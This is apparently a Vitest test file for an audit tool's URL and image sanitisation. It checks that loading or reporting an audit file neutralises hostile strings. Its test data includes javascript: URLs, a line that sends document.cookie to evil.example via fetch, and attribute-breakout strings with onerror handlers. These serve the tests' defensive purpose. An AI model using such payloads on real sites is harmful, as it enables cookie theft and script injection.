import { describe, expect, it } from 'vitest'
import { dataImage, isNavigableUrl, previewOf } from '../src/lib/url-safety'
import { auditFromFile, auditToFile, parseAudit } from '../src/lib/audit-store'
import { buildReportHtml } from '../src/lib/report'
import { auditStats, type PageInput } from '../src/lib/audit-sheet'
import { computeThemes } from '../src/lib/results'
import { sampleAudit } from './fakes'

/** An audit file can be edited by anyone: its strings must never become script or navigation. */
describe('addresses', () => {
  it('only http, https and file addresses can be opened', () => {
    expect(isNavigableUrl('https://example.org/a')).toBe(true)
    expect(isNavigableUrl('file:///tmp/x.html')).toBe(true)
    for (const bad of ['javascript:alert(1)', 'JavaScript:alert(1)', ' javascript:alert(1)', 'data:text/html,<script>1</script>', 'blob:https://x/y', 'chrome://settings', '', 42, null]) {
      expect(isNavigableUrl(bad)).toBe(false)
    }
  })

  it('loading an audit blanks a page address that is not http, https or file', () => {
    const raw = JSON.parse(JSON.stringify(sampleAudit('Hostile')))
    raw.pages[0].url = 'javascript:fetch("https://evil.example/"+document.cookie)'
    expect(parseAudit(raw).pages[0].url).toBe('')
    raw.pages[0].url = 'https://example.org/ok'
    expect(parseAudit(raw).pages[0].url).toBe('https://example.org/ok')
  })
})

describe('images kept in an audit', () => {
  it('only a base64 image data URL is accepted', () => {
    expect(dataImage('data:image/png;base64,iVBORw0KGgo=')).toBe('data:image/png;base64,iVBORw0KGgo=')
    for (const bad of ['https://tracker.example/pixel.gif', 'javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD4=', 'data:image/svg+xml;base64,PHN2Zz4=', 'data:image/png;base64,AAAA" onerror="alert(1)', '', null, 7]) {
      expect(dataImage(bad)).toBeNull()
    }
  })

  it('the report keeps a real screenshot but never lets a hostile one out of its attribute', () => {
    const audit = sampleAudit('Report')
    const page = audit.pages[0]
    const good = 'data:image/png;base64,iVBORw0KGgo='
    const hostile = 'x" onerror="alert(1)" data-x="'
    const finding = (id: number, shot: string) => ({ type: 'link-empty', id, key: `k${id}`, theme: 6, label: `link ${id}`, summary: '', facts: {}, html: '', contextHtml: '', count: 1, data: {}, present: true, scan: 1, shot })
    page.findings = [finding(1, good), finding(2, hostile)] as never
    page.findingReviews = { k1: { answers: { '6.2': 'nc' }, note: '' }, k2: { answers: { '6.2': 'nc' }, note: '' } }
    const computed = computeThemes([], () => undefined, [1, 6], {}, { findings: page.findings, reviews: page.findingReviews, scannedThemes: [6] })
    const input = { label: 'P01', themes: computed.themes, results: computed.images, checklist: {}, findings: page.findings, findingReviews: page.findingReviews, images: [], reviewOf: () => undefined, detectedOf: () => 'named', pageUrl: page.url, pageTitle: page.title } as unknown as PageInput
    void auditStats([input])
    const html = buildReportHtml(audit, [input], [page])
    expect(html).toContain(`<img class="shot" src="${good}"`) // the path is exercised: a real image is there
    expect(html).toContain('link 2') // and so is the hostile finding's row
    expect(html).not.toContain('onerror')
    expect(html).not.toMatch(/<img[^>]+src="x/)
  })
})

describe('opening an audit file', () => {
  it('keeps image previews and previews on the page host, drops previews pointing elsewhere', () => {
    const audit = sampleAudit('Previews')
    const page = audit.pages[0]
    page.url = 'https://www.example.org/page'
    const [first] = page.items
    const withThumb = (id: number, thumb: string) => ({ ...first, id, key: `img-${id}`, thumb })
    page.items = [
      withThumb(1, 'data:image/png;base64,iVBORw0KGgo='),
      withThumb(2, 'https://www.example.org/img/a.png'),
      withThumb(3, 'https://tracker.example/pixel.gif?u=1'),
    ]
    const loaded = auditFromFile(auditToFile(audit))
    expect(loaded.pages[0].items.map((i) => i.thumb)).toEqual(['data:image/png;base64,iVBORw0KGgo=', 'https://www.example.org/img/a.png', null])
  })
})

describe('pictures of elements (shot)', () => {
  it('previewOf shows the picture when it is a base64 image, never an address, else the thumbnail', () => {
    const png = 'data:image/png;base64,iVBORw0KGgo='
    expect(previewOf({ shot: png, thumb: 'https://x.test/a.svg' })).toBe(png)
    expect(previewOf({ shot: null, thumb: 'https://x.test/a.svg' })).toBe('https://x.test/a.svg')
    expect(previewOf({ thumb: null })).toBeNull()
    expect(previewOf({ shot: 'https://tracker.example/p.gif', thumb: 'data:image/png;base64,AAAA' })).toBe('data:image/png;base64,AAAA')
  })

  it('opening a file drops a picture that is not a base64 image, for images and findings', () => {
    const audit = sampleAudit('Shots')
    const page = audit.pages[0]
    const png = 'data:image/png;base64,iVBORw0KGgo='
    const [first] = page.items
    page.items = [{ ...first, id: 1, key: 'i1', shot: png }, { ...first, id: 2, key: 'i2', shot: 'https://tracker.example/pixel.gif' }]
    const finding = (id: number, shot: string) => ({ type: 'link-empty', id, key: `k${id}`, theme: 6, label: `link ${id}`, summary: '', facts: {}, html: '', contextHtml: '', count: 1, data: {}, present: true, scan: 1, shot })
    page.findings = [finding(1, png), finding(2, 'javascript:alert(1)')]
    const loaded = auditFromFile(auditToFile(audit)).pages[0]
    expect(loaded.items.map((i) => i.shot)).toEqual([png, null])
    expect(loaded.findings.map((f) => f.shot)).toEqual([png, null])
  })
})
